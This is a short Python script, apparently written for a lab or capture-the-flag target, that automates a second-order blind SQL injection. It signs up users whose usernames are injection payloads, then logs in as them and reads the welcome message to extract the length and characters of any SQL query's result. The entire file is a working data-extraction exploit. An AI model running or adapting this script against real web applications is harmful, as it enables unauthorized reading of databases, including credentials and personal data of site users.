import requests, sys

urlLogin = "http://"+sys.argv[1]+"/login.php" # URL

alpha = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
pos = 1
query = sys.argv[2]

def create(payload):
	urlSignup = "http://"+sys.argv[1]+"/signup.php"
	data = {
		"fname":"test",
		"email":"test@test.com",
		"psw":"x",
		"uname": payload,
	}
	# proxies = {"http":"http://127.0.0.1:2222"}
	# req = requests.post(urlSignup, data=data, proxies=proxies, allow_redirects=False)
	req = requests.post(urlSignup, data=data, allow_redirects=False)

def getLength():
	for lng in range(1,100):
		payload = "' or length((%s))=%s#" % (query,str(lng))
		create(payload)

		data = {
			"uname": payload,
			"psw":"x",
		}

		# proxies = {"http":"http://127.0.0.1:2222"}
		# req = requests.post(urlLogin, data=data, proxies=proxies)
		req = requests.post(urlLogin, data=data)
		if "Welcome ' or " in req.text:
			return lng
			break

def extract(length):
	out = []
	for lng in range(1,length+1):
		for char in alpha:
			payload = "' or (ascii(substring(("+query+"),"+str(lng)+",1)))='"+str(ord(char))+"'#"
			create(payload)
			data = {
				"uname": payload,
				"psw":"x",
			}
			# proxies = {"http":"http://127.0.0.1:2222"}
			# req = requests.post(urlLogin, data=data, proxies=proxies)
			req = requests.post(urlLogin, data=data)
			try:
				if "Welcome ' or " in req.text:
					out.append(char)
					break
				else:
					pass
			except KeyError:
				print("[-] Error with Query.")
				break
	return ''.join(out)

length = getLength()
print ("Length: "+str(length))
if length != None:
	data = extract(length)
	print(data)